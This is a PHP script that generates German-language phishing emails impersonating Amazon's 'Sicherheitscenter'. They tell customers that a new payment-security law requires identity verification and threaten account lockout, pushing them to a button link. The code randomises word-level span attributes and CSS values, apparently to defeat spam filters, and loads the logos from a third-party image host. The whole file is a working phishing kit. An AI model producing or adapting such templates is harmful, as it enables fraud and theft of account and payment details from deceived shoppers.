<?php
	$button_link = "BUTTON_LINK";
	$button_text = randomText("Weiter zur Identitätsprüfung");
	$mail_betreff  = randomText("Amazon Sicherheitscenter");

	function getImg($index = 0) {
		if ($index == 1) {
			return "http://saved.im/mja3mzy0azh2/nav-sprite-global_bluebeacon-v3-1x_optimized_cb509268273_.png";
		}
		return "http://saved.im/mtgymti3atzv/amazon-logo_v175169556_.gif";
	}
	
	function genRand() {
		return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, rand(5, 20));
	}
	
	function getRandAttribute() {
		return 'name="' . genRand() . '" id="' . genRand() . '" class="' . genRand() . '"';
	}
	
	function getOuter() {
		$outers = array('width:600.0' . rand(10000, 999999) . 'px', 'width:600.0' . rand(10000, 999999) . 'px;border:1.0' . rand(10000, 999999) . 'px solid #E9E9E9', 'width:600.0' . rand(10000, 999999) . 'px;border:3.0' . rand(10000, 999999) . 'px solid #E9E9E9', 'width:600.0' . rand(10000, 999999) . 'px;border:3.0' . rand(10000, 999999) . 'px double #E9E9E9');
		return $outers[rand(0, 3)];
	}
	
	function getHeader() {
		global $img_url;
		global $mail_betreff;
		
		$headers = array(
									'<table cellpadding="0" style="width:600.0' . rand(10000, 999999) . 'px;margin:0 auto;padding:10.0' . rand(10000, 999999) . 'px">
											<tbody>
											<tr>
												<td style="border-bottom:1.0' . rand(10000, 999999) . 'px solid rgb(221,221,221);">
													<table>
														<tbody>
															<tr>
																<td width="250.0' . rand(10000, 999999) . 'px">
																	<a href="#">
																		<img src="' . getImg(0) . '" alt="Amazon.de">
																	</a>
																</td>
																<td width="350.0' . rand(10000, 999999) . 'px" style="text-align:right;font-weight:bold;line-height:27.0' . rand(10000, 999999) . 'px;font-size:21.0' . rand(10000, 999999) . 'px">
																	<h3 style="text-align:right;font-weight:bold;line-height:27.0' . rand(10000, 999999) . 'px;font-size:18.0' . rand(10000, 999999) . 'px">
																		' . $mail_betreff . '
																	</h3>
																</td>
															</tr>
														</tbody>
													</table>
												</td>
											</tr>
										</tbody>
									</table>',
									
									'<div style="width:115.0' . rand(10000, 999999) . 'px;margin-top:25.0' . rand(10000, 999999) . 'px;padding-left:20.0' . rand(10000, 999999) . 'px">
										<img src="' . getImg(0) . '" alt="Amazon.de">
									</div>
									<div style="margin-top:15.0' . rand(10000, 999999) . 'px;background-color:#f3f3f3;border-bottom:1.0' . rand(10000, 999999) . 'px solid rgb(204,204,204);font-size:12.0' . rand(10000, 999999) . 'px;font-weight:bold;padding:15.0' . rand(10000, 999999) . 'px">
										' . $mail_betreff . '
										<span style="float:right"><b>Datum:</b> ' . date("d.m.Y") . '</span>
									</div>',
									
									'<div style="float:left;width:555.0' . rand(10000, 999999) . 'px;height:60.0' . rand(10000, 999999) . 'px;background-color:#232f3e;padding: 13.0' . rand(10000, 999999) . 'px 18.0' . rand(10000, 999999) . 'px 0 27.0' . rand(10000, 999999) . 'px;">
										<div style="background-image:url(' . getImg(1) . ');float: left;text-indent: -500.0' . rand(10000, 999999) . 'px;background-position: -10.0' . rand(10000, 999999) . 'px -51.0' . rand(10000, 999999) . 'px;width: 97.0' . rand(10000, 999999) . 'px;height: 29.0' . rand(10000, 999999) . 'px;"></div>
										<div style="color:#48a3c6;font-size:13.0' . rand(10000, 999999) . 'px;position:absolute;top:41.0' . rand(10000, 999999) . 'px;left:105.0' . rand(10000, 999999) . 'px;font-weight:bold">' . $mail_betreff . '</div>
									</div><br/><br/><br/><br/>',
									
									'<div style="float:left;width:115.0' . rand(10000, 999999) . 'px;margin-top:25.0' . rand(10000, 999999) . 'px;padding-left:10.0' . rand(10000, 999999) . 'px">
										<img src="' . getImg(0) . '" style="border: 0;width: 115.0' . rand(10000, 999999) . 'px">
									</div>
									<div style="margin-top:22.0' . rand(10000, 999999) . 'px;margin-right:10.0' . rand(10000, 999999) . 'px;border-bottom:1.0' . rand(10000, 999999) . 'px solid rgb(204,204,204);float:right;width:450.0' . rand(10000, 999999) . 'px;text-align:right;font-size:12.0' . rand(10000, 999999) . 'px;font-weight:bold">
										' . $mail_betreff . '
									</div>
									<div style="float:right;font-size:12.0' . rand(10000, 999999) . 'px;color:#888;margin-top:.0' . rand(10000, 999999) . 'px;margin-right:10.0' . rand(10000, 999999) . 'px"><b>Datum:</b> ' . date("d.m.Y") . '</div><br/><br/><br/><br/>',
									
									'<div style="float:left;width:115.0' . rand(10000, 999999) . 'px;margin-top:35.0' . rand(10000, 999999) . 'px;padding-left:20.0' . rand(10000, 999999) . 'px">
										<img src="' . getImg(0) . '" style="border: 0;width: 115.0' . rand(10000, 999999) . 'px">
									</div>
									
									<div style="margin-top:15.0' . rand(10000, 999999) . 'px;margin-right:25.0' . rand(10000, 999999) . 'px;line-height:2.5;border-bottom:1.0.0' . rand(10000, 999999) . 'px solid rgb(204,204,204);float:right;width:430.0' . rand(10000, 999999) . 'px;text-align:right;font-size:12.0' . rand(10000, 999999) . 'px;font-weight:bold">
										' . $mail_betreff . '
									</div>
									<div style="margin-right:25.0' . rand(10000, 999999) . 'px;float:right;font-size:12.0' . rand(10000, 999999) . 'px;color:#069;font-weight:bold;margin-top:3.0' . rand(10000, 999999) . 'px">Datum: ' . date("d.m.Y") . '</div><br/><br/><br/><br/>',
									
									'<table cellpadding="0" style="width:575.0' . rand(10000, 999999) . 'px;color:rgb(51,51,51);margin:10.0' . rand(10000, 999999) . 'px auto;margin-bottom:0.0' . rand(10000, 999999) . 'px;border-collapse:collapse;">
										<tbody>
											<tr>
												<td style="padding:0 20.0' . rand(10000, 999999) . 'px 20.0' . rand(10000, 999999) . 'px 20.0' . rand(10000, 999999) . 'px;vertical-align:top;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
													<table cellpadding="0" style="width:100%;margin:0 0 15.0' . rand(10000, 999999) . 'px 0;border-collapse:collapse;">
														<tbody>
														<tr>
															<td rowspan="2" style="width:115.0' . rand(10000, 999999) . 'px;padding:18.0' . rand(10000, 999999) . 'px 0 0 0;vertical-align:top;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																<a href="#" style="text-decoration:none;color:rgb(0,102,153);font:13.0' . rand(10000, 999999) . 'px/18.0' . rand(10000, 999999) . 'px Arial,sans-serif;">
																	<img src="' . getImg(0) . '" style="border: 0;width: 115.0' . rand(10000, 999999) . 'px">
																</a>
															</td>
															<td style="text-align:right;padding:5.0' . rand(10000, 999999) . 'px 0;border-bottom:1.0' . rand(10000, 999999) . 'px solid rgb(204,204,204);white-space:nowrap;vertical-align:top;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																<table align="right" style="border-collapse:collapse;">
																	<tbody>
																	<tr>
																		<td style="padding:0.0' . rand(10000, 999999) . 'px;vertical-align:bottom;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																			<a href="#" style="border-right:0 solid rgb(204,204,204);margin-right:0.0' . rand(10000, 999999) . 'px;padding-right:0.0' . rand(10000, 999999) . 'px;text-decoration:none;color:rgb(0,102,153);font:13.0' . rand(10000, 999999) . 'px/18.0' . rand(10000, 999999) . 'px Arial,sans-serif";>Meine
																				Bestellungen
																			</a>
																		</td>
																		<td style="padding:0.0' . rand(10000, 999999) . 'px;vertical-align:bottom;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																			<span style="text-decoration:none;color:rgb(204,204,204);font:15.0' . rand(10000, 999999) . 'px Arial,san-serif;">&nbsp;&nbsp;|&nbsp;&nbsp;</span>
																		</td>
																		<td style="padding:0.0' . rand(10000, 999999) . 'px;vertical-align:bottom;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																			<a href="#" style="border-right:0 solid rgb(204,204,204);margin-right:0.0' . rand(10000, 999999) . 'px;padding-right:0.0' . rand(10000, 999999) . 'px;text-decoration:none;color:rgb(0,102,153);font:13.0' . rand(10000, 999999) . 'px/18.0' . rand(10000, 999999) . 'px Arial,sans-serif;">Mein
																				Konto
																			</a>
																		</td>
																		<td style="padding:0.0' . rand(10000, 999999) . 'px;vertical-align:bottom;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																			<span style="text-decoration:none;color:rgb(204,204,204);font:15.0' . rand(10000, 999999) . 'px Arial,san-serif;">&nbsp;&nbsp;|&nbsp;&nbsp;</span>
																		</td>
																		<td style="padding:0.0' . rand(10000, 999999) . 'px;vertical-align:bottom;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																			<a href="#" style="border-right:0 solid rgb(204,204,204);margin-right:0.0' . rand(10000, 999999) . 'px;padding-right:0.0' . rand(10000, 999999) . 'px;text-decoration:none;color:rgb(0,102,153);font:13.0' . rand(10000, 999999) . 'px/18.0' . rand(10000, 999999) . 'px Arial,sans-serif;">Amazon.de</a>
																		</td>
																	</tr>
																	</tbody>
																</table>
															</td>
														</tr>
														<tr>
															<td style="text-align:right;padding:7.0' . rand(10000, 999999) . 'px 0 5.0' . rand(10000, 999999) . 'px 0;vertical-align:top;font-size:13.0' . rand(10000, 999999) . 'px;line-height:18.0' . rand(10000, 999999) . 'px;font-family:Arial,sans-serif;">
																<h2 style="font-size:20.0' . rand(10000, 999999) . 'px;line-height:24.0' . rand(10000, 999999) . 'px;margin:0;padding:0;font-weight:normal;color:rgb(0,0,0)!important;">
																	' . $mail_betreff . '
																</h2>
															</td>
														</tr>
														</tbody>
													</table>
												</td>
											</tr>
										</tbody>
									</table>'
								);
		return $headers[rand(0,5)];
	}
	
	function getContentOuter() {
		$contentOuters = array(
											'background-color:#fff;padding:15 15.0' . rand(10000, 999999) . 'px 20.0' . rand(10000, 999999) . 'px 15.0' . rand(10000, 999999) . 'px;font-size:13.0' . rand(10000, 999999) . 'px;border-bottom:1.0' . rand(10000, 999999) . 'px solid #E7E7E7;border-top:1.0' . rand(10000, 999999) . 'px solid #E7E7E7',
											'background-color:#f3f3f3;padding:15.0' . rand(10000, 999999) . 'px 15.0' . rand(10000, 999999) . 'px 30.0' . rand(10000, 999999) . 'px 15.0' . rand(10000, 999999) . 'px;font-size:13.0' . rand(10000, 999999) . 'px;border-bottom:1.0' . rand(10000, 999999) . 'px solid #E7E7E7;border-top:1.0' . rand(10000, 999999) . 'px solid #E7E7E7'
										  );
		return $contentOuters[1];
	}
	
	function getWelcome() {
		$welcomes = array(
										'font-size:18.0' . rand(10000, 999999) . 'px;margin:15.0' . rand(10000, 999999) . 'px 0 0 0;color:rgb(204,102,0);font-weight:normal;',
										'font-size:18.0' . rand(10000, 999999) . 'px;margin:15.0' . rand(10000, 999999) . 'px 0 0 0;color:#000;font-weight:normal;',
										'font-size: 18.0' . rand(10000, 999999) . 'px;color: rgb(204,102,0);border-bottom:1.0' . rand(10000, 999999) . 'px dotted rgb(204,102,0);font-weight:normal;line-height:2',
										'font-size: 18.0' . rand(10000, 999999) . 'px;color: rgb(204,102,0);border-bottom:1.0' . rand(10000, 999999) . 'px solid rgb(204,102,0);font-weight:normal;line-height:2',
										'font-size: 18.0.0' . rand(10000, 999999) . 'px;color: rgb(204,102,0);font-weight:normal'
									);
		return $welcomes[rand(0, 4)];
	}
	
	function getUserInfo() {
		$userInfos = array(
									'background-color:#666666;font-size: 11.0' . rand(10000, 999999) . 'px;color:#fff;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'border-top:1.0' . rand(10000, 999999) . 'px solid #999;border-bottom:1.0' . rand(10000, 999999) . 'px solid #999;background-color:#666666;font-size: 11.0' . rand(10000, 999999) . 'px;color:#fff;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'font-size: 11.0' . rand(10000, 999999) . 'px;color:#333;padding-top:5.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:5.0' . rand(10000, 999999) . 'px',
									'border-top:1.0' . rand(10000, 999999) . 'px solid #999;border-bottom:1.0' . rand(10000, 999999) . 'px solid #999;font-size: 11.0' . rand(10000, 999999) . 'px;color:#333;padding-top:5.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:5.0' . rand(10000, 999999) . 'px',
									'font-size: 11.0' . rand(10000, 999999) . 'px;color:#000;padding-top:5.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:5.0' . rand(10000, 999999) . 'px',
									'font-size: 11.0' . rand(10000, 999999) . 'px;color:#666;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'background-color:#999;font-size: 11.0' . rand(10000, 999999) . 'px;color:#666;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'background-color:#F3F3F3;font-size: 11.0' . rand(10000, 999999) . 'px;color:#666;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'border-top:1.0' . rand(10000, 999999) . 'px solid #999;border-bottom:1.0' . rand(10000, 999999) . 'px solid #999;background-color:#F3F3F3;font-size: 11.0' . rand(10000, 999999) . 'px;color:#666;padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px',
									'font-size: 11.0' . rand(10000, 999999) . 'px;color: rgb(102,102,102);padding-top:15.0' . rand(10000, 999999) . 'px;padding-left:15.0' . rand(10000, 999999) . 'px;padding-bottom:10.0' . rand(10000, 999999) . 'px' 
									);
		return $userInfos[rand(0,9)];
	}
	
	function getButton() {
		global $button_text;
		global $button_link;
		
		$buttons = array(
									'<div style="margin-top: 20.0' . rand(10000, 999999) . 'px;margin-left:20.0' . rand(10000, 999999) . 'px;width: 220.0' . rand(10000, 999999) . 'px;border-radius:3.0' . rand(10000, 999999) . 'px;background-color:#f0c14b;padding:8.0' . rand(10000, 999999) . 'px;font-size:14.0' . rand(10000, 999999) . 'px;border-bottom:1.0' . rand(10000, 999999) . 'px solid #F6DA96;text-align:center">
										<a href="' . $button_link . '" target="_blank" style="text-decoration:none;color:#111">' . $button_text . '</a>
									</div>',
									'<div style="margin-top: 20.0' . rand(10000, 999999) . 'px;margin-left:20.0' . rand(10000, 999999) . 'px;width: 250.0' . rand(10000, 999999) . 'px;border-radius:3.0' . rand(10000, 999999) . 'px;background-color:#f0c14b;padding:8.0' . rand(10000, 999999) . 'px;font-size:14.0' . rand(10000, 999999) . 'px;border-bottom:1.0' . rand(10000, 999999) . 'px solid #F6DA96;text-align:center">
										<a href="' . $button_link . '" target="_blank" style="text-decoration:none;color:#000;font-weight:bold">' . $button_text . '</a>
									</div>',
									'<div style="text-align:center;border:1.0' . rand(10000, 999999) . 'px solid #000;margin: 20.0' . rand(10000, 999999) . 'px 0 10.0' . rand(10000, 999999) . 'px 30.0' . rand(10000, 999999) . 'px;display: block;width: 200.0' . rand(10000, 999999) . 'px;border-radius:3.0' . rand(10000, 999999) . 'px;background-color:#f0c14b;padding:7.0' . rand(10000, 999999) . 'px;font-size:14.0' . rand(10000, 999999) . 'px">
										<a href="' . $button_link . '" target="_blank" style="text-decoration:none;color:#000">' . $button_text . '</a>
									</div>',
									'<div style="text-align:center;border:1.0' . rand(10000, 999999) . 'px solid #000;margin: 20.0' . rand(10000, 999999) . 'px 0 10.0' . rand(10000, 999999) . 'px 30.0' . rand(10000, 999999) . 'px;display: block;width: 200.0' . rand(10000, 999999) . 'px;border-radius:3.0' . rand(10000, 999999) . 'px;background-color:#444c55;padding:7.0' . rand(10000, 999999) . 'px;font-size:14.0' . rand(10000, 999999) . 'px">
										<a href="' . $button_link . '" target="_blank" style="text-decoration:none;color:#fff;font-weight:bold">' . $button_text . '</a>
									</div>',
									'<div style="margin:20.0' . rand(10000, 999999) . 'px auto;padding:8.0' . rand(10000, 999999) . 'px;border:1.0' . rand(10000, 999999) . 'px solid #000;background-color: #F1C659;text-align:center;width: 250.0' . rand(10000, 999999) . 'px;border-radius:5.0' . rand(10000, 999999) . 'px;font-size:13.0' . rand(10000, 999999) . 'px">
										<a href="' . $button_link . '" target="_blank" style="font-weight:bold;color:#111;text-decoration:none">' . $button_text . '</a>
									</div>'
								 );
		return $buttons[rand(0,4)];
	}
	
	function getFooterOuter() {
		$outerFooters = array(
											'color: #767676;background-color: #232f3e;text-align: center;padding:15.0' . rand(10000, 999999) . 'px;font-size:14.0' . rand(10000, 999999) . 'px',
											'font-size:12.0' . rand(10000, 999999) . 'px;padding:15.0' . rand(10000, 999999) . 'px;text-align:center;',
											'color:#767676;background-color:#232F3E;font-size:11.0' . rand(10000, 999999) . 'px;padding:10.0' . rand(10000, 999999) . 'px 5.0' . rand(10000, 999999) . 'px;text-align:center'
										);
		return $outerFooters[rand(0, 2)];	
	}
	
	function getFooterText() {
		$footerTexts = array(
										'&copy; 1998-2017, Amazon.com, Inc. oder Tochtergesellschaften',
										'Amazon EU société à responsabilité limitée, 5 rue Plaetis, L-2338 Luxemburg. Stammkapital: EUR 37.500. RCS Luxemburg Registernummer: B 101818. Gewerbeerlaubnisnummer: 134248. Umsatzsteueridentifikationsnummer: LU 20260743.',
										'Unsere AGB&nbsp;&nbsp;Datenschutzerklärung&nbsp;&nbsp;Impressum&nbsp;&nbsp;Cookies & Internet-Werbung&nbsp;&nbsp;&nbsp;<br/><br/>&copy; 1998-2017, Amazon.com, Inc. oder Tochtergesellschaften'
											);
		return randomText($footerTexts[rand(0, 2)]);
	}
	
	function randomText($text) {
		$textArr = explode(" ", $text);
		$randText = null;
		
		for ($i = 0; $i < count($textArr); $i++) {
			$randText .= "<span " . getRandAttribute() . ">". $textArr[$i] . "</span> ";
		}
		
		return $randText;
	}
?>

<!DOCTYPE html>
<html lang="de">
	<head>
		<title>Neue Mitteilung - Referenznr.: <?php echo genRand() ?></title>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
		<style>
			@font-face{
			    font-family:'Amazon Ember';
			    src:local("Amazon Ember"),local("AmazonEmber-Regular"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_rg-cc7ebaa05a2cd3b02c0929ac0475a44ab30b7efa._V2_.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_rg-8a9db402d8966ae93717c348b9ab0bd08703a7a7._V2_.woff) format("woff")
			}
			@font-face{
			    font-family:'Amazon Ember';
			    font-style:italic;
			    src:local("Amazon Ember"),local("AmazonEmber-Italic"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_rgit-9cc1bb64eb270135f1adf3a4881c2ee5e7c37be5._V2_.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_rgit-a4dc98d644ff2aedd41da3da462f09ffce86eafb._V2_.woff) format("woff")
			}
			@font-face{
			    font-family:'Amazon Ember';
			    font-weight:700;
			    src:local("Amazon Ember"),local("AmazonEmber-Bold"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_bd-46b91bda68161c14e554a779643ef4957431987b._V2_.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_bd-b605252f87b8b3df5ae206596dac0938fc5888bc._V2_.woff) format("woff")
			}
			@font-face{
			    font-family:'Amazon Ember';
			    font-style:italic;
			    font-weight:700;
			    src:local("Amazon Ember"),local("AmazonEmber-BoldItalic"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_bdit-80ff7aba37dd1ff5a6b90233a19e3a780a96dc2f._V2_.woff2) format("woff2"),url(https://m.media-amazon.com/images/G/01/AUIClients/AmazonUIBaseCSS-amazonember_bdit-57598ce426a612be5a1d15eee08252668fca5e7a._V2_.woff) format("woff")
			}	
		</style>	
	</head>
	
	<body style="font-family:'Amazon Ember',Arial,sans-serif" <?php echo getRandAttribute() ?>>
		<div style="<?php echo getOuter() ?>" <?php echo getRandAttribute() ?>>
			<?php echo getHeader() ?>
			
			<div style="<?php echo getContentOuter() ?>" <?php echo getRandAttribute() ?>>
				<div style="<?php echo getWelcome() ?>" <?php echo getRandAttribute() ?>><?php echo randomText("Sehr geehrte Kundin, sehr geehrter Kunde,"); ?></div>
				<br/><br/>
				Es gelten neue Mindestanforderungen für die Sicherheit von Internetzahlungen ( § 270a )<br/>
				Aus diesem Grund sind wir dazu verpflichtet, Ihre Idendität in regelmäßigen Abständen zu überprüfen.<br/>
				<br/>
				Achten Sie während der Überprüfung auf die richtige Eingabe Ihrer Daten, sollte das<br/>
				System Abweichungen zu den bereits hinterlegten Daten feststellen wird Ihr Amazon-Konto<br/>
				automatisch aus Datenschutzrechtlichen Gründen gesperrt. Sollte dieser Fall eintreffen,<br/>
				ist ein Datenabgleich nur noch über das Post - Ident Verfahren möglich. <br/>
				<br/>
				
				<?php echo getButton() ?>
				

			</div>
		
			<div style="<?php echo getUserInfo() ?>" <?php echo getRandAttribute() ?>>
				<?php echo randomText("Dies ist eine automatisch versendete Nachricht.<br/>Bitte antworten Sie nicht auf dieses Schreiben, da die Adresse nur zur Versendung von E-Mails eingerichtet ist."); ?>
			</div>
			
			<div style="<?php echo getFooterOuter() ?>" <?php echo getRandAttribute() ?>>
				<?php echo (getFooterText()) ?>
			</div>
		</div>
	</body>
</html>